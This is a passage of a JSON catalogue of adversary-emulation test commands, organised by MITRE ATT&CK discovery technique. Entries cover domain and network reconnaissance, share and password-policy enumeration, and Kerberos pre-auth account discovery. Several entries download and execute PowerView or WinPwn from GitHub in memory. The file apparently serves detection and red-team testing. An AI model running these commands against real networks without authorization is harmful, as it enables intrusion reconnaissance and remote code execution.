         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc dclist"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
         "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
         "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
         "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
         "command": "nltest.exe /dclist:%userdnsdomain%"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
         "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip tcp_metrics show |grep --invert-match \"^127\\.\""
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
         "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
         "command": "arp -a"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
         "command": "net group /domain \"Domain controllers\""
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
         "command": "net view /domain && net view"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Use the ip route command to display the kernels routing tables. \n",
         "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip route show"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
         "command": "net group \"Domain Computers\" /domain"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
         "command": "adidnsdump -u domain\\user -p password --print-zones 192.168.1.1"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
         "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
         "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }; catch { $_; exit $_.Exception.HResult }"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Locate all active IP and FQDNs on the network",
         "command": "arp -a"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Get a list of all computers in a domain",
         "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify the remote domain controllers",
         "command": "nltest /dsgetdc:%USERDOMAIN%\n"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify the organizations mail server",
         "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "View the known_hosts file",
         "command": "cat ~/.ssh/known_hosts\n"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
         "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Find hostname of remote IP in domain",
         "command": "nslookup #{remote.host.ip}\n"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Find hostname of remote host",
         "command": "nbtstat -A #{remote.host.ip}"
      }
   ],
   "T1614.001": [
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n",
         "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale"
      },
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
         "command": "chcp"
      },
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n",
         "command": "env | grep LANG; printenv LANG; set | grep LANG"
      },
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n",
         "command": "locale"
      },
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n",
         "command": "localectl status"
      },
      {
         "technique_id": "T1614.001",
         "technique_name": "System Location Discovery: System Language Discovery",
         "tactic": "discovery",
         "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
         "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language"
      }
   ],
   "T1135": [
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n",
         "command": "dir \\\\127.0.0.1\\c$ && dir \\\\127.0.0.1\\admin$ && dir \\\\127.0.0.1\\IPC$"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
         "command": "net share"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network share enumeration using the shareenumeration function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery using smbstatus\n",
         "command": "sudo smbstatus --shares"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
         "command": "net view \\\\localhost"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
         "command": "get-smbshare"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
         "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\") { ; } else {New-Item -Type Directory \"C:\\Users\\puma-4\\Desktop\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"};  ;  Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Invoke-ShareFinder -CheckShareAccess"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery\n",
         "command": "df -aH; smbutil view -g //computer1; showmount computer1"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "Network Share Discovery",
         "command": "Get-SmbShare | ConvertTo-Json"
      },
      {
         "technique_id": "T1135",
         "technique_name": "Network Share Discovery",
         "tactic": "discovery",
         "description": "View the shares of a remote host",
         "command": "net view \\\\#{remote.host.fqdn} /all"
      }
   ],
   "T1201": [
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the domain password policy to console on Windows.\n",
         "command": "net accounts /domain"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the password policy to console on macOS.\n",
         "command": "pwpolicy getaccountpolicies"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
         "command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then : ; else echo Please run from CentOS or RHEL v7; fi;  ;  cat /etc/security/pwquality.conf"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "This atomic test will display details about the password policy for the current AWS account.\n",
         "command": "aws iam get-account-password-policy"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
         "command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then : ; else echo Please run from CentOS or RHEL v6; fi;  ;  cat /etc/pam.d/system-auth; cat /etc/security/pwquality.conf"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
         "command": "get-addefaultdomainpasswordpolicy"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the password complexity policy to console on Ubuntu Linux.\n",
         "command": "cat /etc/pam.d/common-password"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
         "command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
         "command": "cat /etc/login.defs"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Lists the local password policy to console on Windows.\n",
         "command": "net accounts"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery",
         "tactic": "discovery",
         "description": "Password Policy Discovery",
         "command": "pwpolicy getaccountpolicies\n"
      },
      {
         "technique_id": "T1201",
         "technique_name": "Password Policy Discovery for a domain",
         "tactic": "discovery",
         "description": "Password Policy Discovery for a domain",
         "command": "net accounts /domain\n"
      }
   ],
   "T1518": [
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
         "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist; /usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
         "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
         "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Check to see what version of python is installed",
         "command": "python3 --version;python2 --version;python --version\n"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Check to see if Gooogle Chrome browser is installed",
         "command": "which google-chrome\n"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Determine the version of Internet Explorer running",
         "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"
      },
      {
         "technique_id": "T1518",
         "technique_name": "Software Discovery",
         "tactic": "discovery",
         "description": "Check to see if GoLang is installed",
         "command": "which go\n"
      }
   ],
   "T1069.002": [
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
         "command": "ldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
         "command": "net localgroup && net group /domain && net group \"enterprise admins\" /domain && net group \"domain admins\" /domain"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
         "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
         "command": "Get-AdGroup -Filter *"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\""
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
         "command": "net groups \"Account Operators\" /doma && net groups \"Exchange Organization Management\" /doma && net group \"BUILTIN\\Backup Operators\" /doma && net group /domai \"Domain Admins\""
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
         "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
         "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
         "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
         "command": "get-ADPrincipalGroupMembership $env:USERNAME | select name"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\""
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Use PowerView to query the Active Directory server to determine remote admins",
         "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n"
      },
      {
         "technique_id": "T1069.002",
         "technique_name": "Permission Groups Discovery: Domain Groups",
         "tactic": "discovery",
         "description": "Use PowerView to query the Active Directory server to determine remote admins",
         "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n"
      }
   ],
   "T1124": [
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
         "command": "time"
      },
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
         "command": "Get-Date"
      },
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
